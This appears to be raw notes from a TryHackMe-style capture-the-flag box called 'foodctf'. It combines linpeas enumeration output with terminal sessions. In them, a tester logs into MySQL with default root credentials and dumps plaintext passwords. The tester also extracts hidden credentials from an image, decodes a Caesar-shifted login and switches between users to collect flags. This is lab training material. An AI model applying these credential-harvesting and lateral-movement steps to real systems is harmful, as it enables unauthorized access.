2023-02-18+16:36:04.1196099180 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8689.mount/cgroup.event_control
2023-02-18+16:36:04.1171757990 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
2023-02-18+16:36:04.1146633360 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
2023-02-18+16:36:04.1121567270 /var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
2023-02-18+16:36:04.1097078270 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
2023-02-18+16:36:04.1071826690 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2023-02-18+16:36:04.1046407500 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2023-02-18+16:36:04.1021700450 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2023-02-18+16:36:04.0995726700 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
2023-02-18+16:36:04.0971321950 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2023-02-18+16:36:04.0946069280 /var/lib/lxcfs/cgroup/memory/system.slice/pings.service/cgroup.event_control
2023-02-18+16:36:04.0920845100 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
2023-02-18+16:36:04.0896253580 /var/lib/lxcfs/cgroup/memory/system.slice/inetd.service/cgroup.event_control
2023-02-18+16:36:04.0870684130 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2023-02-18+16:36:04.0845576090 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2023-02-18+16:36:04.0820883350 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
2023-02-18+16:36:04.0793617280 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
2023-02-18+16:36:04.0769230330 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
2023-02-18+16:36:04.0743813350 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2023-02-18+16:36:04.0718479380 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2023-02-18+16:36:04.0693762200 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2023-02-18+16:36:04.0667397530 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2023-02-18+16:36:04.0641679120 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
2023-02-18+16:36:04.0616591370 /var/lib/lxcfs/cgroup/memory/system.slice/koth.service/cgroup.event_control
2023-02-18+16:36:04.0591153650 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2023-02-18+16:36:04.0563746050 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2023-02-18+16:36:04.0539755310 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
2020-03-20+03:04:34.5360579060 /usr/bin/screen-4.5.0
2020-03-19+16:40:01.1504693820 /etc/console-setup/cached_setup_terminal.sh
2020-03-19+16:40:01.1504693820 /etc/console-setup/cached_setup_keyboard.sh
2020-03-19+16:40:01.1504693820 /etc/console-setup/cached_setup_font.sh
2020-03-19+15:57:54.9040528880 /etc/network/if-up.d/mtuipv6
2020-03-19+15:57:54.9040528880 /etc/network/if-pre-up.d/mtuipv6

╔══════════╣ Unexpected in root
/swap.img
/vmlinuz.old
/vmlinuz
/initrd.img
/initrd.img.old

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 36
drwxr-xr-x  2 root root 4096 Mar 20  2020 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root  825 Jun  5  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 May 11  2019 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 May 11  2019 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/systemd/system/pings.service
The following files aren't owned by root: /etc/systemd/system/pings.service

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/tryhackme/.viminfo
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/bread/.gnupg/pubring.kbx
/home/bread/.gnupg/trustdb.gpg
/home/bread/.config/lxc/config.yml
/var/log/journal/c214c9d4231b4554bf4c0d97704f5dcf/system.journal
/var/log/journal/c214c9d4231b4554bf4c0d97704f5dcf/user-1004.journal
/var/log/kern.log
/var/log/syslog

logrotate 3.11.0

╔══════════╣ Files inside /home/bread (limit 20)
total 7904
drwxr-xr-x 7 bread bread    4096 Feb 18 16:35 .
drwxr-xr-x 7 root  root     4096 Mar 28  2020 ..
-rw------- 1 bread bread       5 Apr  6  2020 .bash_history
-rw-r--r-- 1 bread bread     220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 bread bread    3771 Mar 20  2020 .bashrc
drwx------ 2 bread bread    4096 Mar 20  2020 .cache
drwxr-x--- 3 bread bread    4096 Feb 18 16:35 .config
----r--r-- 1 bread bread      38 Mar 28  2020 flag
drwx------ 3 bread bread    4096 Feb 18 16:35 .gnupg
drwxrwxr-x 3 bread bread    4096 Mar 20  2020 .local
-rwxrwxr-x 1 bread bread 8037916 Apr  6  2020 main
-rw-rw-r-- 1 bread bread    1513 Apr  6  2020 main.go
-rw-r--r-- 1 bread bread     825 Mar 28  2020 .profile
drwxrwxr-x 3 bread bread    4096 Apr  6  2020 resources

╔══════════╣ Files inside others home (limit 20)
/home/tryhackme/.profile
/home/tryhackme/.sudo_as_admin_successful
/home/tryhackme/.mysql_history
/home/tryhackme/flag7
/home/tryhackme/img.jpg
/home/tryhackme/img
/home/tryhackme/.bash_logout
/home/tryhackme/.bashrc
/home/tryhackme/.viminfo
/home/tryhackme/.wget-hsts
/home/pasta/.profile
/home/pasta/.bash_logout
/home/pasta/.bashrc
/home/ramen/.profile
/home/ramen/.bash_logout
/home/ramen/.bashrc
/home/food/.profile
/home/food/.mysql_history
/home/food/.flag
/home/food/.bash_logout

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 465928 Jul 20  2018 /usr/bin/screen.old
-rw-r--r-- 1 root root 0 Feb 28  2020 /usr/src/linux-headers-4.15.0-91-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Feb 28  2020 /usr/src/linux-headers-4.15.0-91-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217468 Feb 28  2020 /usr/src/linux-headers-4.15.0-91-generic/.config.old
-rw-r--r-- 1 root root 2746 Dec  5  2019 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11755 Mar 20  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 7857 Feb 28  2020 /lib/modules/4.15.0-91-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 7905 Feb 28  2020 /lib/modules/4.15.0-91-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 2765 Aug  5  2019 /etc/apt/sources.list.curtin.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /snap/core/8689/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 tryhackme tryhackme 220 Apr  4  2018 /home/tryhackme/.bash_logout
-rw-rw-r-- 1 tryhackme tryhackme 173 Mar 20  2020 /home/tryhackme/.wget-hsts
-rw-r--r-- 1 pasta pasta 220 Mar 20  2020 /home/pasta/.bash_logout
-rw-r--r-- 1 ramen ramen 220 Mar 20  2020 /home/ramen/.bash_logout
-rw-r--r-- 1 bread bread 220 Mar 20  2020 /home/bread/.bash_logout
-rw-rw-r-- 1 food food 38 Mar 28  2020 /home/food/.flag
-rw-r--r-- 1 food food 220 Mar 19  2020 /home/food/.bash_logout
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Mar 19  2020 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 Mar 19  2020 /var/cache/apparmor/.features
-rw-r--r-- 1 landscape landscape 0 Aug  5  2019 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 37 Feb 18 16:07 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Feb 18 16:07 /run/cloud-init/.ds-identify.result
-rw------- 1 root root 0 Jun 21  2019 /snap/core/7270/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/7270/etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 12  2020 /snap/core/8689/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8689/etc/skel/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 bread bread 828098 Feb 10 20:38 /tmp/linpeas.sh
-rw-r--r-- 1 root root 3439 Mar 19  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 33538 Mar 20  2020 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/systemd/system/pings.service
/home/bread
/run/lock
/run/screen
/snap/core/7270/run/lock
/snap/core/7270/tmp
/snap/core/7270/var/tmp
/snap/core/8689/run/lock
/snap/core/8689/tmp
/snap/core/8689/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1004
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/img.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/inetd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/koth.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/pings.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8689.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group bread:
/etc/systemd/system/pings.service

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2020-03-19 16:40:10,960 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2020-03-19 16:40:10,997 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
2020-03-19 16:40:10,997 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-03-19 17:26:28,328 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-19 17:26:28,328 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-19 17:56:15,272 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-19 17:56:15,272 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-19 21:00:18,353 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-19 21:00:18,353 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 00:16:58,169 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 00:16:58,169 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 02:40:05,470 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 02:40:05,470 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 03:18:34,093 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 03:18:34,093 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 19:29:25,301 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 19:29:25,301 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 23:18:25,776 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 23:18:25,776 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-27 23:18:36,062 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-27 23:18:36,062 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-27 23:26:06,670 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-27 23:26:06,670 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-30 03:02:58,528 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-30 03:02:58,528 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-31 00:59:16,296 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-31 00:59:16,296 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-04-06 20:06:11,077 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-04-06 20:06:11,077 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-04-06 20:25:35,785 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-04-06 20:25:35,786 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-04-06 20:49:57,886 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-04-06 20:49:57,886 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-02-18 16:08:04,538 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-02-18 16:08:04,538 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
Binary file /var/log/journal/c214c9d4231b4554bf4c0d97704f5dcf/user-1004.journal matches
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
Mar 19 15:55:21 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Mar 19 15:55:21 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Mar 19 16:02:56 ubuntu-server chage[14112]: changed password expiry for sshd
Mar 19 16:02:56 ubuntu-server usermod[14107]: change user 'sshd' password
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


Found ╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034 and ═╣ MySQL connection using default root/root ........... Yes

┌──(witty㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.241.181 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show datbases;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'datbases' at line 1
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.204 sec)

MySQL [(none)]> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [users]> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| User            |
+-----------------+
1 row in set (0.198 sec)

MySQL [users]> select * from User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | thm{2f30841ff8d9646845295135adda8332} |
+----------+---------------------------------------+
2 rows in set (0.202 sec)

bread@foodctf:/home$ su ramen
su ramen
Password: noodlesRTheBest

ramen@foodctf:~$ sudo -l
sudo -l
[sudo] password for ramen: noodlesRTheBest
               
Sorry, user ramen may not run sudo on foodctf.

┌──(witty㉿kali)-[~/bug_hunter]
└─$ ssh ramen@10.10.241.181
ramen@10.10.241.181's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 18 16:52:53 UTC 2023

  System load:  0.01              Processes:           101
  Usage of /:   43.7% of 9.78GB   Users logged in:     0
  Memory usage: 55%               IP address for eth0: 10.10.241.181
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 18 16:47:54 2023 from 10.8.19.103
ramen@foodctf:~$ sudo -l
[sudo] password for ramen:                
Sorry, user ramen may not run sudo on foodctf.
ramen@foodctf:~$ sudo -l
[sudo] password for ramen: ***************

*****?

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.241.181 16109
whoami
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close

400 Bad Request  

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.241.181:16109
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.241.181:16109 --output filekoth
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  372k    0  372k    0     0   282k      0 --:--:--  0:00:01 --:--:--  282k

┌──(witty㉿kali)-[~/Downloads]
└─$ file filekoth        
filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3

┌──(witty㉿kali)-[~/Downloads]
└─$ binwalk -e filekoth 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
381172        0x5D0F4         gzip compressed data, from Unix, last modified: 2020-03-19 23:53:20

┌──(witty㉿kali)-[~/Downloads]
└─$ cd _filekoth.extracted                           
                                                                                   
┌──(witty㉿kali)-[~/Downloads/_filekoth.extracted]
└─$ ls
5D0F4  5D0F4.gz

┌──(witty㉿kali)-[~/Downloads/_filekoth.extracted]
└─$ cat 5D0F4             
creds.txt0000644000000000000000000000002513634770536011430 0ustar  rootrootpasta:pastaisdynamic

or just

no passphrase

┌──(witty㉿kali)-[~/Downloads]
└─$ steghide extract -sf filekoth  
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ cat creds.txt 
pasta:pastaisdynamic


ramen@foodctf:~$ su pasta
Password: 
pasta@foodctf:/home/ramen$ cd /home/pasta
pasta@foodctf:~$ ls
pasta@foodctf:~$ ls -lah
total 28K
drwxr-xr-x 4 pasta pasta 4.0K Mar 21  2020 .
drwxr-xr-x 7 root  root  4.0K Mar 28  2020 ..
-rw-r--r-- 1 pasta pasta  220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 pasta pasta 3.7K Mar 20  2020 .bashrc
drwx------ 2 pasta pasta 4.0K Mar 21  2020 .cache
drwx------ 3 pasta pasta 4.0K Mar 21  2020 .gnupg
-rw-r--r-- 1 pasta pasta  825 Mar 28  2020 .profile

┌──(witty㉿kali)-[~/Downloads]
└─$ telnet 10.10.241.181 46969
Trying 10.10.241.181...
Connected to 10.10.241.181.
Escape character is '^]'.
tccr:uwjsasqccywsg

https://www.dcode.fr/caesar-cipher

food:givemecookies

──(witty㉿kali)-[~/Downloads]
└─$ telnet 10.10.241.181 46969
Trying 10.10.241.181...
Connected to 10.10.241.181.
Escape character is '^]'.
tccr:uwjsasqccywsg
foodctf login: food
Password: 
Last login: Sat Mar 21 00:20:49 UTC 2020 on tty1
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 18 17:17:45 UTC 2023

  System load:  0.0               Processes:           107
  Usage of /:   44.1% of 9.78GB   Users logged in:     1
  Memory usage: 56%               IP address for eth0: 10.10.241.181
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


food@foodctf:~$ whoami
-bash: whoami: No such file or directory
food@foodctf:~$ ls
-bash: ls: No such file or directory
food@foodctf:~$ ls -lah
-bash: ls: No such file or directory
food@foodctf:~$ pwd
/home/food
food@foodctf:~$ cd /root
-bash: cd: /root: Permission denied
food@foodctf:~$ cd /home
food@foodctf:/home$ ls
-bash: ls: No such file or directory

uhmm


pasta@foodctf:/tmp$ su food
Password: 
food@foodctf:/tmp$ cd /home/food
food@foodctf:~$ ls -lah
total 40K
drwxr-xr-x 5 food food 4.0K Mar 30  2020 .
drwxr-xr-x 7 root root 4.0K Mar 28  2020 ..
-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
-rw-r--r-- 1 food food 3.7K Mar 19  2020 .bashrc
drwx------ 2 food food 4.0K Mar 19  2020 .cache
-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
drwx------ 3 food food 4.0K Mar 19  2020 .gnupg
drwxrwxr-x 3 food food 4.0K Mar 19  2020 .local
-rw------- 1 food food   23 Mar 19  2020 .mysql_history
-rw-r--r-- 1 food food  815 Mar 28  2020 .profile
food@foodctf:~$ cat .flag
thm{58a3cb46855af54d0660b34fd20a04c1}
food@foodctf:~$ cat .mysql_history 
_HiStOrY_V2_
ls
;
exit

2 flags

food@foodctf:~$ find / -type f -name flag* 2>/dev/null
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
